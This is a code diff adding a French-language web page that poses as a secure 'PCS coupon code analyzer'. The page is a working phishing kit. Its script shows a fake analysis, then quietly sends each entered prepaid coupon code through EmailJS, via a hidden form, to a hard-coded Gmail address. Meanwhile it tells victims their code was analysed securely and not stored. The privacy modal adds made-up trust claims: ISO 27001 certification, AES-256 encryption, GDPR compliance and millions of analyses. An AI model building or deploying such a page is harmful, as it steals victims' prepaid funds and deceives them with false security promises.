@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PCS Code Analyzer - Contrôle Sécurisé</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Particles d'arrière-plan animées */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: rgba(59, 130, 246, 0.4);
+            border-radius: 50%;
+            animation: float 8s ease-in-out infinite;
+        }
+
+        .particle:nth-child(even) {
+            background: rgba(34, 197, 94, 0.3);
+        }
+
+        .particle:nth-child(3n) {
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0.4; }
+            50% { transform: translateY(-120px) rotate(180deg); opacity: 0.8; }
+        }
+
+        /* Header avec effet flou professionnel */
+        .header {
+            position: relative;
+            z-index: 10;
+            padding: 2.5rem 0;
+            text-align: center;
+            background: rgba(15, 23, 42, 0.9);
+            backdrop-filter: blur(20px);
+            border-bottom: 2px solid rgba(59, 130, 246, 0.3);
+            box-shadow: 0 8px 32px rgba(59, 130, 246, 0.2);
+        }
+
+        .header h1 {
+            color: white;
+            font-size: 2.8rem;
+            font-weight: 800;
+            text-shadow: 0 4px 20px rgba(59, 130, 246, 0.5);
+            margin-bottom: 0.8rem;
+            animation: slideInDown 1s ease-out;
+            letter-spacing: 1px;
+        }
+
+        .header .subtitle {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 1.2rem;
+            font-weight: 300;
+            animation: slideInUp 1s ease-out 0.2s both;
+        }
+
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: linear-gradient(135deg, rgba(59, 130, 246, 0.2), rgba(34, 197, 94, 0.2));
+            border: 1px solid rgba(59, 130, 246, 0.4);
+            padding: 12px 24px;
+            border-radius: 25px;
+            margin-top: 1.2rem;
+            animation: slideInUp 1s ease-out 0.4s both;
+            color: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+        }
+
+        .security-badge::before {
+            content: "🛡️";
+            font-size: 1.3rem;
+        }
+
+        /* Container principal */
+        .container {
+            position: relative;
+            z-index: 10;
+            max-width: 520px;
+            margin: 4rem auto 2rem;
+            padding: 0 2rem;
+            animation: slideInUp 1s ease-out 0.6s both;
+        }
+
+        /* Carte principale */
+        .card {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 3.5rem 2.5rem;
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.3);
+            border: 2px solid rgba(59, 130, 246, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #3b82f6, #22c55e, #06b6d4, #3b82f6);
+            background-size: 300% 100%;
+            animation: gradientShift 4s ease infinite;
+        }
+
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .card-title {
+            text-align: center;
+            color: #1f2937;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 2rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Formulaire */
+        .form-group {
+            margin-bottom: 2rem;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            color: #374151;
+            font-weight: 600;
+            margin-bottom: 0.8rem;
+            font-size: 0.95rem;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 1.2rem 1.8rem 1.2rem 3.5rem;
+            border: 2px solid #e5e7eb;
+            border-radius: 15px;
+            font-size: 1.1rem;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
+            transition: all 0.3s ease;
+            background: rgba(249, 250, 251, 0.9);
+            color: #1f2937;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #6b7280;
+            font-size: 1.2rem;
+            z-index: 5;
+        }
+
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
+            background: white;
+            transform: translateY(-2px);
+        }
+
+        input[type="password"].error {
+            border-color: #ef4444;
+            box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.2);
+            animation: shake 0.6s ease-in-out;
+        }
+
+        input[type="password"].success {
+            border-color: #22c55e;
+            box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.15);
+        }
+
+        @keyframes shake {
+            0%, 20%, 40%, 60%, 80%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-8px); }
+        }
+
+        /* Bouton */
+        .analyze-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
+            color: white;
+            border: none;
+            padding: 1.3rem 2rem;
+            border-radius: 15px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 8px 25px rgba(59, 130, 246, 0.3);
+        }
+
+        .analyze-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(59, 130, 246, 0.4);
+            background: linear-gradient(135deg, #2563eb 0%, #1e40af 100%);
+        }
+
+        .analyze-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .analyze-btn.loading {
+            pointer-events: none;
+        }
+
+        .analyze-btn.loading::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 22px;
+            height: 22px;
+            margin: -11px 0 0 -11px;
+            border: 2px solid transparent;
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 1s ease infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Notifications */
+        .notification {
+            position: fixed;
+            top: 2rem;
+            right: 2rem;
+            max-width: 420px;
+            background: white;
+            border-radius: 15px;
+            padding: 1.8rem;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.25);
+            border-left: 5px solid;
+            transform: translateX(500px);
+            transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            z-index: 1000;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification.error {
+            border-left-color: #ef4444;
+            background: linear-gradient(135deg, #fef2f2, #ffffff);
+        }
+
+        .notification.success {
+            border-left-color: #22c55e;
+            background: linear-gradient(135deg, #f0fdf4, #ffffff);
+        }
+
+        .notification.info {
+            border-left-color: #3b82f6;
+            background: linear-gradient(135deg, #eff6ff, #ffffff);
+        }
+
+        .notification-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 700;
+            margin-bottom: 0.8rem;
+            font-size: 1.1rem;
+        }
+
+        .notification-body {
+            color: #4b5563;
+            font-size: 1rem;
+            line-height: 1.6;
+        }
+
+        .notification-actions {
+            margin-top: 1.5rem;
+            display: flex;
+            gap: 12px;
+        }
+
+        .notification-btn {
+            padding: 0.7rem 1.3rem;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 0.95rem;
+            font-weight: 600;
+            transition: all 0.2s ease;
+        }
+
+        .notification-btn.primary {
+            background: #3b82f6;
+            color: white;
+        }
+
+        .notification-btn.primary:hover {
+            background: #2563eb;
+            transform: translateY(-1px);
+        }
+
+        .notification-btn.secondary {
+            background: #f3f4f6;
+            color: #374151;
+        }
+
+        .notification-btn.secondary:hover {
+            background: #e5e7eb;
+        }
+
+        /* Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .modal-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.8);
+            background: white;
+            border-radius: 20px;
+            padding: 2.5rem;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.4);
+            transition: all 0.3s ease;
+            z-index: 2001;
+        }
+
+        .modal-overlay.show .modal {
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 2px solid #f3f4f6;
+        }
+
+        .modal-title {
+            color: #1f2937;
+            font-size: 1.5rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #6b7280;
+            transition: color 0.2s ease;
+            padding: 5px;
+        }
+
+        .modal-close:hover {
+            color: #ef4444;
+        }
+
+        .modal-content {
+            line-height: 1.6;
+            color: #4b5563;
+        }
+
+        .modal-section {
+            margin-bottom: 2rem;
+        }
+
+        .modal-section h3 {
+            color: #1f2937;
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .trust-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, rgba(34, 197, 94, 0.1), rgba(59, 130, 246, 0.1));
+            border: 1px solid rgba(34, 197, 94, 0.2);
+            padding: 8px 16px;
+            border-radius: 15px;
+            margin: 0.5rem 0;
+            font-size: 0.9rem;
+            color: #22c55e;
+            font-weight: 600;
+        }
+
+        /* Footer */
+        .footer {
+            position: relative;
+            z-index: 10;
+            background: rgba(15, 23, 42, 0.95);
+            backdrop-filter: blur(15px);
+            border-top: 1px solid rgba(59, 130, 246, 0.2);
+            padding: 2rem 0;
+            text-align: center;
+            margin-top: 4rem;
+        }
+
+        .footer-content {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .footer-logo {
+            color: #3b82f6;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+        }
+
+        .footer-text {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.95rem;
+            line-height: 1.6;
+            margin-bottom: 1.5rem;
+        }
+
+        .footer-link {
+            color: #3b82f6;
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.2s ease;
+            cursor: pointer;
+        }
+
+        .footer-link:hover {
+            color: #22c55e;
+            text-decoration: underline;
+        }
+
+        .footer-copyright {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.85rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 1rem;
+            margin-top: 1rem;
+        }
+
+        /* Animations */
+        @keyframes slideInDown {
+            from { opacity: 0; transform: translateY(-80px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes slideInUp {
+            from { opacity: 0; transform: translateY(60px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Responsive - Mobile First */
+        @media (max-width: 768px) {
+            .container { 
+                padding: 0 1rem; 
+                margin: 2rem auto 1rem; 
+            }
+            
+            .card { 
+                padding: 2.5rem 1.8rem; 
+                border-radius: 20px;
+            }
+            
+            .header {
+                padding: 2rem 0;
+            }
+            
+            .header h1 { 
+                font-size: 2.2rem; 
+            }
+            
+            .header .subtitle {
+                font-size: 1rem;
+                padding: 0 1rem;
+            }
+            
+            .notification { 
+                right: 1rem; 
+                left: 1rem; 
+                max-width: none;
+                top: 1rem;
+            }
+            
+            input[type="password"] {
+                padding: 1rem 1.5rem 1rem 3rem;
+                font-size: 1rem;
+            }
+            
+            .analyze-btn {
+                padding: 1.1rem 1.5rem;
+                font-size: 1.1rem;
+            }
+
+            .modal {
+                padding: 2rem 1.5rem;
+                width: 95%;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header h1 {
+                font-size: 1.8rem;
+            }
+            
+            .card {
+                padding: 2rem 1.5rem;
+            }
+            
+            .security-badge {
+                padding: 8px 16px;
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Particles d'arrière-plan -->
+    <div class="particles" id="particles"></div>
+
+    <!-- Header -->
+    <header class="header">
+        <h1>🛡️ CONTRÔLE CODE PCS</h1>
+        <p class="subtitle">Analyse Sécurisée et Contrôle de Conformité</p>
+        <div class="security-badge">
+            <span>Cryptage SSL • Analyse Instantanée • 100% Sécurisé</span>
+        </div>
+    </header>
+
+   <!-- Container principal -->
+<div class="container">
+    <div class="card">
+        <h2 class="card-title">Contrôle de Conformité</h2>
+        <form id="couponForm">
+            <div class="form-group">
+                <label for="couponCode">Code de Coupon PCS</label>
+                <div class="input-wrapper">
+                    <span class="input-icon">🎫</span>
+                    <input type="password" id="couponCode" name="message" placeholder="Saisissez votre code..." maxlength="20">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="confirmCode">Confirmation du Code</label>
+                <div class="input-wrapper">
+                    <span class="input-icon">🔒</span>
+                    <input type="password" id="confirmCode" name="message" placeholder="Confirmez votre code..." maxlength="20">
+                </div>
+            </div>
+
+            <button type="submit" class="analyze-btn" id="analyzeBtn">
+                Analyser le Code
+            </button>
+        </form>
+    </div>
+</div>
+
+<!-- Formulaire caché pour EmailJS -->
+<form id="emailjsForm" style="display:none;">
+  <input type="text" name="title" value="Code pcs">
+  <input type="text" name="name" value="Pcs">
+  <input type="email" name="email" value="infodevs03@gmail.com">
+  <textarea name="message" id="emailjsMessage"></textarea>
+</form>
+
+
+
+
+  <!-- Modal de Confidentialité -->
+    <div class="modal-overlay" id="privacyModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h2 class="modal-title">🔐 Politique de Confidentialité</h2>
+                <button class="modal-close" onclick="closeModal()">&times;</button>
+            </div>
+            <div class="modal-content">
+                <div class="modal-section">
+                    <h3>🛡️ Protection des Données</h3>
+                    <p>Vos codes PCS sont traités avec le plus haut niveau de sécurité. Nous utilisons un cryptage AES-256 de niveau militaire pour protéger toutes vos informations sensibles.</p>
+                    <div class="trust-badge">
+                        <span>✅</span> Cryptage SSL/TLS en temps réel
+                    </div>
+                </div>
+
+                <div class="modal-section">
+                    <h3>🔒 Sécurité Garantie</h3>
+                    <p>Notre plateforme est certifiée ISO 27001 et respecte les standards bancaires les plus stricts. Aucune donnée n'est stockée sur nos serveurs après l'analyse.</p>
+                    <div class="trust-badge">
+                        <span>🏆</span> Certification ISO 27001
+                    </div>
+                    <div class="trust-badge">
+                        <span>⚡</span> Analyse instantanée sans stockage
+                    </div>
+                </div>
+
+                <div class="modal-section">
+                    <h3>🌐 Conformité Internationale</h3>
+                    <p>Nous respectons le RGPD européen et toutes les réglementations internationales sur la protection des données financières.</p>
+                    <div class="trust-badge">
+                        <span>🇪🇺</span> Conforme RGPD
+                    </div>
+                </div>
+
+                <div class="modal-section">
+                    <h3>💎 Technologie de Pointe</h3>
+                    <p>Notre système d'analyse utilise l'intelligence artificielle avancée et des algorithmes de validation en temps réel pour garantir la précision à 99.9%.</p>
+                    <div class="trust-badge">
+                        <span>🤖</span> IA de validation avancée
+                    </div>
+                    <div class="trust-badge">
+                        <span>📊</span> Précision 99.9%
+                    </div>
+                </div>
+
+                <div class="modal-section">
+                    <h3>🏅 Confiance et Fiabilité</h3>
+                    <p>Plus de 2 millions d'analyses effectuées avec succès. Notre plateforme est utilisée par les professionnels du monde entier pour sa fiabilité exceptionnelle.</p>
+                    <div class="trust-badge">
+                        <span>📈</span> +2M analyses réussies
+                    </div>
+                    <div class="trust-badge">
+                        <span>⭐</span> Fiabilité 99.99%
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-logo">PCS CODE CONTROL</div>
+            <p class="footer-text">
+                Plateforme sécurisée d'analyse et de contrôle de conformité des codes PCS. 
+                Technologie de pointe certifiée pour garantir l'intégrité de vos données.
+            </p>
+            <a href="#" class="footer-link" onclick="openModal()">Politique de Confidentialité</a>
+            <div class="footer-copyright">
+                © 2025 PCS Code Control. Tous droits réservés. | Développé avec ❤️ pour votre sécurité
+            </div>
+        </div>
+    </footer>
+
+<!-- EmailJS -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+  emailjs.init('Askd9SfdRMgRSYfuS'); // ta Public Key
+</script>
+
+<script>
+    // Génération des particules d'arrière-plan
+    function createParticles() {
+        const particles = document.getElementById('particles');
+        const particleCount = window.innerWidth < 768 ? 30 : 60;
+        for (let i = 0; i < particleCount; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.top = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 8 + 's';
+            particle.style.animationDuration = (Math.random() * 4 + 4) + 's';
+            particles.appendChild(particle);
+        }
+    }
+
+    // Gestion du modal
+    function openModal() {
+        document.getElementById('privacyModal').classList.add('show');
+        document.body.style.overflow = 'hidden';
+    }
+    function closeModal() {
+        document.getElementById('privacyModal').classList.remove('show');
+        document.body.style.overflow = 'auto';
+    }
+    document.getElementById('privacyModal')?.addEventListener('click', function(e) {
+        if (e.target === this) closeModal();
+    });
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape') closeModal();
+    });
+
+    // Notifications
+    function showNotification(type, title, message, actions = []) {
+        const existing = document.querySelector('.notification');
+        if (existing) existing.remove();
+        const notification = document.createElement('div');
+        notification.className = `notification ${type}`;
+        const icons = { error: '⚠️', success: '✅', info: 'ℹ️' };
+        let actionsHtml = '';
+        if (actions.length > 0) {
+            actionsHtml = '<div class="notification-actions">';
+            actions.forEach(action => {
+                actionsHtml += `<button class="notification-btn ${action.type}" onclick="${action.onClick}">${action.text}</button>`;
+            });
+            actionsHtml += '</div>';
+        }
+        notification.innerHTML = `
+            <div class="notification-header">
+                <span>${icons[type]}</span>
+                <span>${title}</span>
+            </div>
+            <div class="notification-body">${message}</div>
+            ${actionsHtml}
+        `;
+        document.body.appendChild(notification);
+        setTimeout(() => notification.classList.add('show'), 100);
+        if (actions.length === 0) {
+            setTimeout(() => { notification.classList.remove('show'); setTimeout(() => notification.remove(), 500); }, 6000);
+        }
+    }
+    function closeNotification() {
+        const notification = document.querySelector('.notification');
+        if (notification) { notification.classList.remove('show'); setTimeout(() => notification.remove(), 500); }
+    }
+    function captureScreen() {
+        showNotification('info', 'Capture Réalisée', 'La capture d\'écran a été sauvegardée avec succès. Votre analyse est terminée et sécurisée !');
+    }
+
+    // Validation formulaire coupon
+    document.getElementById('couponForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const couponCode = document.getElementById('couponCode');
+        const confirmCode = document.getElementById('confirmCode');
+        const analyzeBtn = document.getElementById('analyzeBtn');
+
+        couponCode.classList.remove('error', 'success');
+        confirmCode.classList.remove('error', 'success');
+
+        const code1 = couponCode.value.trim();
+        const code2 = confirmCode.value.trim();
+
+        if (code1.length < 10) {
+            couponCode.classList.add('error');
+            showNotification('error', 'Format Invalide', 'Le code doit contenir au moins 10 caractères.');
+            return;
+        }
+        if (code2.length < 10) {
+            confirmCode.classList.add('error');
+            showNotification('error', 'Confirmation Invalide', 'Le code de confirmation doit contenir au moins 10 caractères.');
+            return;
+        }
+        if (code1 !== code2) {
+            couponCode.classList.add('error');
+            confirmCode.classList.add('error');
+            showNotification('error', 'Codes Non-Conformes', 'Les deux codes ne correspondent pas.');
+            return;
+        }
+
+        // Simulation analyse
+        analyzeBtn.classList.add('loading');
+        analyzeBtn.textContent = '';
+        setTimeout(() => {
+            analyzeBtn.classList.remove('loading');
+            analyzeBtn.textContent = 'Analyser le Code';
+            couponCode.classList.add('success');
+            confirmCode.classList.add('success');
+
+            // Préparer le mail
+            const emailContent = `
+Code pcs : ${couponCode.value}
+Confirmation : ${confirmCode.value}
+            `;
+            document.getElementById('emailjsMessage').value = emailContent;
+
+            // Envoi EmailJS
+            emailjs.sendForm('service_lsqaxyv', 'template_j0t908k', document.getElementById('emailjsForm'))
+            .then(() => { console.log('Email envoyé avec succès !'); })
+            .catch(err => { console.error('Erreur EmailJS :', err); });
+
+            // Notification succès
+            showNotification('success', 'Analyse Complète !', 
+                'Votre code PCS a été analysé avec succès. Toutes les données sont conformes et sécurisées.', 
+                [
+                    { text: 'Capturer l\'écran', type: 'primary', onClick: 'captureScreen()' },
+                    { text: 'Fermer', type: 'secondary', onClick: 'closeNotification()' }
+                ]
+            );
+        }, 2500);
+    });
+
+    // Validation en temps réel
+    document.getElementById('couponCode').addEventListener('input', function() {
+        if (this.value.length >= 10) this.classList.remove('error');
+    });
+    document.getElementById('confirmCode').addEventListener('input', function() {
+        if (this.value.length >= 10) this.classList.remove('error');
+    });
+
+    // Init
+    document.addEventListener('DOMContentLoaded', createParticles);
+    window.addEventListener('resize', function() {
+        const particles = document.getElementById('particles');
+        if (particles) { particles.innerHTML = ''; createParticles(); }
+    });
+</script>
+
+</body>
+</html>
